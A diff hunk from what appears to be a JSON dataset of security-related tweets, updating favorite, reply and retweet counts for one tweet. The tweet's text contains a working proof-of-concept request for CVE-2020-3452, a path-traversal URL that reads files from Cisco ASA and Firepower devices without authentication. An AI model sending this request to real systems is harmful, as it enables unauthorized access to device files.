@@ -124,10 +124,10 @@
     "username": "Cognosec"
 }
 {
-    "tweetfavorites": 1515,
+    "tweetfavorites": 1495,
     "tweetquotes": 33,
-    "tweetreplies": 36,
-    "tweetretweets": 711,
+    "tweetreplies": 37,
+    "tweetretweets": 693,
     "tweettext": "Here is POC of CVE-2020-3452, unauthenticated file read in Cisco ASA &amp; Cisco Firepower.\n\nFor example to read \"/+CSCOE+/portal_inc.lua\" file.\n\nhttps://&lt;domain&gt;/+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../\n\nHappy Hacking! https://t.co/aBA3R7akkC",
     "tweettime": "2020-07-22, 18:56:45",
     "tweeturl": "https://twitter.com/aboul3la/status/1286012324722155525",
